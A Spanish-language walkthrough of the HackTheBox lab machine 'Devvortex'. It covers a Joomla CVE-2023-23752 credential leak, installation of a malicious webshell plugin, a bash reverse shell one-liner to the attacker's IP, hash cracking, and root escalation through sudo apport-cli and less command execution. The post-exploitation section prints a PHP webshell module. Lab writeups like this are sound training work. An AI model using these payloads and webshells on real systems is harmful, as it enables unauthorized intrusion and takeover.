---
layout      : post
title       : "HackTheBox - Devvortex"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_banner.png
category    : [ htb ]
tags        : [ apport-cli, sudo, joomla, cracking ]
---
Entorno Linux, fuzzeos, rompiendo **Joomla** mediante vulns y plugins, credenciales volando y privilegios para analizar problemas con ayuda de **apport-cli**.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_devvortexHTB.png" style="width: 100%;"/>

## TL;DR (Spanish writeup)

**Laboratorio creado por**: [7u9y](https://www.hackthebox.eu/profile/260996).

Procesando 🚚

Se nos presentará un sitio web, usando su dominio y realizado fuzzing, llegaremos a un subdominio que está ejecutando ***Joomla*** en su versión **4.2**.

Profundizando en esa versión llegaremos a una vulnerabilidad que permite acceder a información confidencial a cualquier usuario. Mediante esto obtendremos usuarios y credenciales válidas para **MySQL**. Realizando reutilización de credenciales podremos ingresar como el usuario ***lewis*** al panel administrativo de **Joomla**.

Aprovecharemos nuestro poder de administrador para instalar un plugin malicioso y lograr así, ejecución remota de comandos como el usuario ***www-data***.

Internamente, volveremos a usar esas credenciales, esta vez para ver el contenido de la base de datos de **Joomla**, en ella obtendremos credenciales a crackear para el usuario ***logan***, funcionales en **Joomla**, pero también en el sistema.

Finalmente, aprovecharemos un permiso que tiene **logan** para ejecutar como cualquier usuario el programa ***apport-cli***, lo usaremos para, a la vez que vemos informes de crashes en el sistema, ejecutar comandos.

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_statistics.png" style="width: 80%;"/>

Mucho CVE, pasos con exploits públicos, por lo tanto, cositas reales.

> La idea inicial de esta locura es tener mis "notas" por si algun día se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) 😄 La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo la oportunidad de ayudarlos ¿por qué no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva más de enseñanza que de solo pasos a seguir. Sin menos, muchas gracias <3

...

Dis fru tan do.

1. [Reconocimiento](#reconocimiento).
2. [Enumeración](#enumeracion).
3. [Explotación](#explotacion).
4. [Movimiento lateral, www-data -> logan](#lateral-mysql-joomla-logan).
5. [Escalada de privilegios](#escalada-de-privilegios).
6. [Post-Explotación](#post-explotacion).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

Jugamos primero con `nmap` para validar que puertos (servicios) están expuestos en la máquina:

```bash
nmap -p- --open -v 10.10.11.242 -oA TCP_initScan_Devvortex
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535 puertos |
| --open    | Devuelve solo los puertos que estén abiertos |
| -v        | Permite ver en consola lo que va encontrando |
| -oA       | Guarda el output en diferentes formatos, uno de ellos "grepeable", lo usaremos junto a la función [extractPorts](https://pastebin.com/raw/X6b56TQ8) de [S4vitar](https://s4vitar.github.io/) para copiar los puertos en la clipboard |

Se nos muestra:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Podemos obtener una terminal de forma segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Podemos interactuar con un servidor web. |

> 💡 Usando la función `extractPorts` (referenciada antes) podemos tener rápidamente los puertos en la clipboard, en este caso no es necesario (ya que tenemos pocos puertos), pero si tuviéramos varios puertos evitamos tener que escribirlos uno a uno:

> ```bash
> extractPorts TCP_initScan_Devvortex.gnmap
> ```

Listones, ya teniendo los puertos, podemos hacer un escaneo más profundo, ahora diciéndole a **nmap** que use sus scripts para ver si encuentra algo más y también que intente extraer la versión exacta del software usado por cada servicio:

```bash
nmap -sCV -p 22,80 10.10.11.242 -oA TCP_portScan_Devvortex
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |

Y obtenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) |
| 80     | HTTP     | nginx 1.18.0 (Ubuntu) |

* Nos muestra que está intentando una redirección al siguiente dominio: `devvortex.htb`, ya hablaremos de esto.

Por el momento no tenemos nada más relevante, así que sigamos.

# Enumeración [#](#enumeracion) {#enumeracion}

Vamos a empezar como casi siempre, recorriendo el servicio web.

## Dando vueltas por la web [📌](#enum-puerto80) {#enum-puerto80}

Como ya vimos con `nmap`, el sitio nos está redirigiendo al dominio `devvortex.htb`, solo que si lo ponemos en nuestro navegador, obtendremos un error, esto debido a que nuestro sistema no entiende a que nos referimos, para hacérselo entender jugaremos con el archivo [/etc/hosts](https://www.manageengine.com/network-monitoring/how-to/how-to-add-static-entry.html). Así lograremos que al momento de hacer una petición contra el dominio, este resuelva correctamente con respecto al contenido alojado en su dirección IP.

```bash
➧ cat /etc/hosts                
...
10.10.11.242    devvortex.htb
...
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_page80.png" style="width: 100%;"/>

Listo (:

La web nos habla de "DevVortex" como empresa y sus funciones, encontramos algunos nombres de empleados y un correo para información, esto puede ser útil (como pueda que no):

* emily r
* michael b
* lewis g
* info@DevVortex.htb  

Nada más para jugar.

Procedemos a realizar una búsqueda de objetos alojados en el servidor web (fuzzing), pero tampoco vemos nada relevante... Al realizar lo mismo, pero para buscar subdominios ([otros contenidos alojados en la misma IP](https://linube.com/ayuda/articulo/267/que-es-un-virtualhost)), nos topamos con uno:

```bash
ffuf -c -w /opt/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.242 -H 'Host: FUZZ.devvortex.htb' -fs 154
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_ffuf_subdomainFound.png" style="width: 100%;"/>

El subdominio `dev.devvortex.htb` devuelve un contenido distinto al alojado en `devvortex.htb`, así que hacemos lo mismo de antes con el `/etc/hosts` y revisamos:

```bash
➧ cat /etc/hosts                
...
10.10.11.242    devvortex.htb dev.devvortex.htb
...
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_page80dev.png" style="width: 100%;"/>

Por encima encontramos otro correo (contact@devvortex.htb), pero nada más, realizando de nuevo un fuzzeo ahora si vemos cosas interesantes:

```bash
ffuf -c -w /opt/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://dev.devvortex.htb/FUZZ
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_ffuf_dev_directoriesFound.png" style="width: 100%;"/>

Revisando por ejemplo `/administrator` nos encontramos, nada más y nada menos, que con el servicio [Joomla](https://www.joomla.org/):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_page80dev_administrator.png" style="width: 100%;"/>

> 📎 **Joomla** es un gestor de contenido (como **Wordpress**), con él podemos dar vida a un sitio web y -gestionarlo-.

Bien bien, nuevo foco.

## Caminando con Joomla [📌](#enum-puerto80-dev) {#enum-puerto80-dev}

De primeras no logramos ningún acceso con credenciales por default, ni con algunas inyecciones y tampoco notamos alguna versión. Volvemos a jugar con **fuzzing**:

```bash
ffuf -c -w /opt/seclists/Discovery/Web-Content/raft-large-files.txt -u http://dev.devvortex.htb/FUZZ 
```

Entre ellos está el objeto `README.txt`, el cual si revisamos, nos indica la versión aprox que está siendo ejecutada:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_page80dev_READMEtxt.png" style="width: 100%;"/>

* Joomla 4.2...

Ya cerramos mucho más nuestro foco, podemos ir a la web y buscar vulns relacionadas con esa versión de **Joomla**... Y efectivamente encontramos:

* [Joomla! v4.2.8 - Unauthenticated information disclosure](https://www.exploit-db.com/exploits/51334).
* [Joomla! CVE-2023-23752 to Code Execution](https://vulncheck.com/blog/joomla-for-rce).
* POC Chino: [Joomla (CVE-2023-23752)](https://xz.aliyun.com/t/12175?time__1311=mqmhD5DK7IejhDBdPx2DUoxAOQCE6d45x&alichlgref=https%3A%2F%2Fvulncheck.com%2F)

¡Así que vamos a romper esto!

# Explotación [#](#explotacion) {#explotacion}

La vulnerabilidad, como bien indica su nombre, es una filtración de información, esta se da debido a unos fallos en la validación de accesos y permisos, permitiendo así que cualquier usuario que no esté autenticado, llegue a información confidencial.

Usando [este POC](https://www.exploit-db.com/exploits/51334) como ayuda, notamos que la información la obtiene de dos endpoints:

```html
#{root_url}/api/index.php/v1/users?public=true
#{root_url}/api/index.php/v1/config/application?public=true
```

Visitando cada uno de ellos, encontramos cositas:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_page80dev_apiLeak_users.png" style="width: 60%;"/>

Usuarios y correos del servicio **Joomla**. Ojito...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_page80dev_apiLeak_config.png" style="width: 60%;"/>

Epaleee, unas credenciales, relacionadas con el usuario `lewis` y que según los POCs, apunta al gestor de la base de datos, peeeero, los administradores son perezosos, pueda que esta credencial se haya usado en más de un servicio, ¿no?

Probando ingresar como `lewis` y usando esa contraseña contra el login de **Joomla**...

> Momentico, alguien rompio la máquina.

> Listones :P

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_page80dev_administrator_index.png" style="width: 100%;"/>

TAMOS DEEEEENTROOOOO (:

Ahora a ejecutar código en esta vuelta!

## ¿Modificación de plantillas? Mehh... [📌](#explotacion-joomla-templates) {#explotacion-joomla-templates}

Realizando el típico **RCE** de modificar algún templete, nos devuelve que no tenemos permisos para modificar los archivos en el sistema:

> `System > Site Templates > -seleccionar template- > editar index.php > Save`

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_page80dev_administrator_templateNotWritable.png" style="width: 50%;"/>

Recorriendo las demás plantillas, encontramos la que muestra todo el visual administrativo (donde estamos), en ella sí podemos guardar el contenido.

Pero leyendo [este POC](https://vulncheck.com/blog/joomla-for-rce) de la vuln que explotamos antes, notamos otro tipo de explotación, instalar un plugin malicioso!

Me llamó la atención, ya que no lo he hecho antes y pues es algo nuevo a aprender, así que de cabeza con esa ruta.

## Plugineo suaveteo en Joomla [📌](#explotacion-joomla-plugins) {#explotacion-joomla-plugins}

El [POC](https://vulncheck.com/blog/joomla-for-rce) referencia un recurso con el plugin malicioso a instalar:

* [https://github.com/p0dalirius/Joomla-webshell-plugin](https://github.com/p0dalirius/Joomla-webshell-plugin)

El repo es medio claro, ya que no entendemos realmente que hay por detrás o incluso, que debemos subir, peeero en sus menciones, nos queda todo claro:

* [Crear un módulo simple/Desarrollo de un Módulo Básico](https://docs.joomla.org/J3.x:Creating_a_simple_module/Developing_a_Basic_Module/es).
* [Creating a Simple Module](https://docs.joomla.org/J4.x:Creating_a_Simple_Module)

> 👹 Vamos a ir un poco directo, estos recursos te los puedes leer, pero no entraremos mucho en detalle, usaremos el plugin ya creado del repo. Esto para efectos de no hacer tan larga la resolución, peeeero, en la [**post-explotación**](#post-explotacion-joomla-manual-plugin) te dejo el paso a paso para crear este plugin manualmente y con el contenido que queramos (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_google_joomlaDoc_installingAndViewingModule.png" style="width: 100%;"/>

Bien, debemos comprimir todos los archivos (listados en los dos recursos que te puse arriba) y ese `.zip` es el que usará **Joomla** para instalar el plugin. En este caso no es necesario, ya que dentro del repo, en la carpeta `dist` ya está el comprimido:

```bash
7z l Joomla-webshell-plugin/dist/joomla-webshell-plugin-1.1.0.zip
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_7zLIST_joomlaMaliciousPlugin.png" style="width: 100%;"/>

Así que procedemos a instalarlo, para esto visitamos en la interfaz administrativa:

```html
System > Extensions > Install Extensions:
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_page80dev_administrator_installExtensions.png" style="width: 100%;"/>

Seleccionamos el archivo `.zip`, cargamos y tamos, ya debió quedar instalado el plugin, validamos realizando la misma consulta que hicimos para instalar la extensión y ordenando por fechas de creación:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_page80dev_administrator_installExtensions_pluginInstalled.png" style="width: 100%;"/>

Para llegar al módulo, hacemos una petición contra el recurso:

```html
http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_page80dev_modules_modWebshell.png" style="width: 100%;"/>

Y para ejecutar comandos, enviaríamos los parámetros `action=exec` y `cmd=<comando a ejecutar>`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_page80dev_modules_modWebshell_RCE_id.png" style="width: 100%;"/>

Y estamos EJECUTANDO códigoooooooooooooooo!!

Para entablar una reverse shell podemos usar esta forma:

1. Ponemos en escucha un puerto en nuestra máquina: `nc -lvp 4440`
2. Le damos forma a nuestro comando, le indicamos que nos envíe una **bash** a nuestra IP y PUERTO que tenemos escuchando: `bash -c 'bash -i >& /dev/tcp/10.10.14.150/4440 0>&1'`.
3. En internet buscamos **URL Encode**, abrimos la web, colocamos esa cadena y nos quedamos con el output.
4. Obtenemos algo tal que: `bash%20-c%20%27bash%20-i%20%3E%...`.
5. Y listo, ese sería el contenido a pasarle al parámetro `cmd`.

> Lo hacemos así para evitar que los caracteres especiales (` `, `'`, `-`, `>`, etc) corrompan la información enviada y por consiguiente la petición.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_nc_wwwdataSH.png" style="width: 100%;"/>

Liiiiistones, tamos dentro...

# tequieromucho: www-data -> logan [#](#lateral-mysql-joomla-logan) {#lateral-mysql-joomla-logan}

Revisando inicialmente los archivos del sitio web, encontramos el objeto relacionado con la configuración de la base de datos de **Joomla**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_wwwdataSH_cat_configurationPHPjoomla.png" style="width: 100%;"/>

Cierto, las credenciales que usamos, originalmente son del gestor de bases de datos, además, en el sistema existe el usuario `logan` yyyy habíamos visto mediante el leak de usuarios, que también existe `logan` en la base de datos de **Joomla**, por lo que veamos si esto tiene que ver...

```bash
mysql -u lewis -p
...
mysql> show databases;
mysql> use joomla;
mysql> select * from sd4fg_users;
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_wwwdataSH_mysql_joomlaUsersTable.png" style="width: 100%;"/>

Pos sí, tenía sentido lo que decíamos, ahora intentemos crackear esa contraseña. Tomamos todo el hash, lo guardamos en un archivo de nuestro sistema y apoyados de [john the ripper](https://www.redeszone.net/tutoriales/seguridad/crackear-contrasenas-john-the-ripper/) tirémosle a ver si alguna palabra del diccionario hace match con el hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt joomla_logan_pw.hash
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_john_joomlaLoganPassword_cracked.png" style="width: 100%;"/>

Ejeleeeee, contamos con una nueva credencial, en este caso para el servicio **Joomla**, peeeeeeeero, lo mismo de antes, ¿qué tal que **logan** haya estado despistado y asigno esa misma credencial para su sesión de sistema? Añañai:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_loganSH.png" style="width: 100%;"/>

Si si siiii, incluso podríamos entablar una shell **SSH** para estar más cómodos: `ssh logan@devvortex.htb`.

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Como el usuario **logan** tenemos asignado un permiso para ejecutar como cualquier usuario del sistema (cualquiera) el programa `/usr/bin/apport-cli`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_loganSH_sudoL.png" style="width: 100%;"/>

Interesante... Validando el manual propio del comando, entendemos su función:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_loganSH_manApportCli1.png" style="width: 100%;"/>

> 💾 Recolectar información de procesos que han fallado en su ejecución y generar reportes para su evaluación.

Algo importante es que los reportes generados son guardados en el objeto `/var/crash/`.

También nos indica que el comando se puede ejecutar simplemente pasándole el reporte y en la ejecución nos dirá que queremos hacer:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_loganSH_manApportCli2.png" style="width: 100%;"/>

Buscando información sobre como podríamos aprovechar este privilegio, nos saluda un CVE:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_google_apportCli_CVEwithLESS.png" style="width: 100%;"/>

* [https://github.com/diego-tella/CVE-2023-1326-PoC](https://github.com/diego-tella/CVE-2023-1326-PoC)

Uhhh, juguetón, la vulnerabilidad habla del aprovechamiento del comando que por detrás ejecuta `apport-cli` para mostrar la info, [less](https://www.servidoresadmin.com/less/):

> 🔲 "El comando `less` de Linux se usa para mostrar el texto en la pantalla de la terminal. Muestra el contenido de un fichero línea a línea, no se puede manipular ni editar el texto. Con este comando se puede subir y/o bajar por el texto." ~ [servidoresadmin.com - less](https://www.servidoresadmin.com/less/)

Al momento de procesar el reporte, nos muestra la info, todo normal por ahora, peeeero **less** tiene una cosita que nos permite ejecutar comandos en el sistema :O

```bash
man less
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_loganSH_manLess_shellCommand.png" style="width: 100%;"/>

Por lo que cuando obtengamos el output, podremos simplemente agregar como input `!` seguido del comando a ejecutar y hacer magia...

PEEEEEEEERO, primero debemos generar algún crash :P

Igual que siempre, se pueden plantear muchas maneras, en mi caso abriré otra consola para ayudarnos, desde una correré un comando por mucho tiempo y desde la otra lo romperé.

1. Jugamos con el comando `sleep`, indicándole que espere **60** segundos (pero lo dicho, puede ser cualquier valor, lo que nos dé tiempo de terminarlo).
2. En la primera consola lo ejecutamos.
3. En la segunda buscamos el **Process ID** de ese comando.
4. Lo terminamos abruptamente.
5. Esto generará el crash y su reporte dentro de la ruta `/var/crash/`.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_loganSH_generatingCrashFile.png" style="width: 100%;"/>

Perfecto, todo lindo por ahora...

Lo siguiente será mediante `apport-cli` leer el reporte:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_loganSH_apportCli_viewingCrashFile.png" style="width: 100%;"/>

Esperamos un rato a que lo procese, finalmente la consola nos devolverá el resultado y el movimiento permitido al usar `less`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_loganSH_apportCli_viewingCrashFile_lessWaiting.png" style="width: 100%;"/>

Y como último paso, lo que ya dijimos, aprovechar el uso de `!` para pasarle un comando, por ejemplo `id`:

```bash
!id
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_loganSH_apportCli_viewingCrashFile_lessCommandInjection_logan_id.png" style="width: 100%;"/>

LISTONEEES! Repetimos el proceso pero ahora ejecutando `apport-cli` como **root** y ejecutando una `bash`:

```bash
sudo /usr/bin/apport-cli /var/crash/_usr_bin_sleep.1000.crash
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_bash_loganSH_apportCli_viewingCrashFile_lessCommandInjection_root_bash.png" style="width: 100%;"/>

Finiquitau, hemos terminado la máquina (:

# Post-Explotación [#](#post-explotacion) {#post-explotacion}

---

## Flags [📌](#post-exploitation-flags) {#post-exploitation-flags}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_flags.png" style="width: 100%;"/>

## Creación manual de plugin malicioso para Joomla [📌](#post-explotacion-joomla-manual-plugin) {#post-explotacion-joomla-manual-plugin}

Realmente es muy sencillo, me lo imaginaba todo rarito, pero nada, siguiendo la guía nos demoramos 2 mins.

* [Creating a simple Joomla module with parameters](https://docs.joomla.org/J4.x:Creating_a_Simple_Module).
* [Creando un módulo simple en Joomla](https://docs.joomla.org/J3.x:Creating_a_simple_module/Developing_a_Basic_Module/es)

Necesitamos 3 archivos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_google_createAsimpleModule_requiredFiles.png" style="width: 100%;"/>

Como vemos el principal y donde estará toda la matralla será el `.php` inicial, los demás tienen información para que **Joomla** interprete correctamente la información.

> Siguiendo cualquier guia vamos a poder ejecutar comandos.

🗃️ `mod_sheshe.php` (el principal y único importante).

En las guías este objeto tiene mucha información, pero claro, eso en la guía, nosotros no queremos usar cosas externas ni nada, que lea el archivo y que tome el contenido del parámetro `xmd` y lo ejecute como comando en el sistema:

```php
<?php

echo exec($_REQUEST["xmd"]);

?>
```

🗃️ `tmpl/default.php` (lo dejamos igual que como está en la guía, no es relevante, pero sí necesario)

```bash
mkdir tmpl
touch tmpl/default.php
```

```php
<?php 
// No direct access
defined('_JEXEC') or die; ?>
<?php echo $hello; ?>
```

🗃️ `mod_sheshe.xml` (modificamos unas líneas y borramos otras, cambios pequeños)

```xml
<?xml version="1.0" encoding="utf-8"?>
<extension type="module" version="3.1.0" client="site" method="upgrade">
    <name>System - Entradas Cine</name>
    <author>Carlitos</author>
    <version>1.0.0</version>
    <description>Bueno, estas son tus entradas para el cine, modula.</description>
    <files>
        <filename>mod_sheshe.xml</filename>
        <filename module="mod_sheshe">mod_sheshe.php</filename>
        <filename>tmpl/default.php</filename>
    </files>
    <config>
    </config>
</extension>
```

Y listo, como dijimos en el writeup, lo siguiente es comprimir el objeto e instalarlo en **Joomla**:

```bash
➧ ls    
mod_sheshe.php  mod_sheshe.xml  tmpl
```

```bash
zip -r moduleando.zip .
```

Y subimos esta vainaaaaaaaa!!

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_page80dev_administrator_installExtensions_pluginSheshe_installed.png" style="width: 100%;"/>

Epale, ahora, la prueba de la verdad:

```html
http://dev.devvortex.htb/modules/mod_sheshe/mod_sheshe.php?xmd=id
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devvortex/htb577_page80dev_modules_modSheshe_RCE_id.png" style="width: 100%;"/>

Lindo lindo. Bien sencillo, pero quería probar :P

...

Máquina bonita, sencilla claramente, pero disfrutable y divertida, además aprendimos tanto a instalar plugins en **Joomla** (incluso maliciosos) como a validar crashes en el sistema (guiño).

Nos volveremos a leer, a seguir dándole duro y claramente a seguir rompiendo de todoooooooo!! Abrazos :*